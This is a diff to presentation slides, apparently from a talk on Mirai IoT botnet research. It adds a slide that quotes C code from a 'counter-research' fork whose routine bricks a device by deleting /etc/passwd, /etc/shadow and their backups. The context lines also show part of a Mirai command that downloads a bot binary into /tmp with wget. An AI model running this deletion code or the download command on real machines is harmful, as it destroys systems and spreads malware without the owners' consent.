@@ -141,6 +141,25 @@ cd /tmp && wget -q http://catsmeowalot.com/ayyx86 &&
 
 #VSLIDE
 
+#VSLIDE
+
+## Should/could we brick .. *pardon* .. clean the "world"?
+
+*Mirai-Counter-Research/mirai/bot/patch.c*
+
+<pre>
+int patch_password()
+{
+	//TODO: Less intrusive cases
+
+	//Last resort -- brick the machine
+	//TODO:
+	return (unlink("/etc/passwd") && 
+   unlink("/etc/passwd-") && 
+   unlink("/etc/shadow") && 
+   unlink("/etc/shadow-"));
+}
+</pre>
 
 #HSLIDE
 
@@ -148,6 +167,7 @@ cd /tmp && wget -q http://catsmeowalot.com/ayyx86 &&
 * *Skiddos* did excellent awareness rising capaign, what's next?
   * INDUSTRIAL INTERNET SECURITY FRAMEWORK (http://www.iiconsortium.org/IISF.htm, ~170p)
   * Future-proofing the Connected World (https://downloads.cloudsecurityalliance.org/assets/research/internet-of-things/future-proofing-the-connected-world.pdf, ~70p)
+  * ... probably many more
 * DDoS as a service is off the shelf for now ...
 
 #HSLIDE
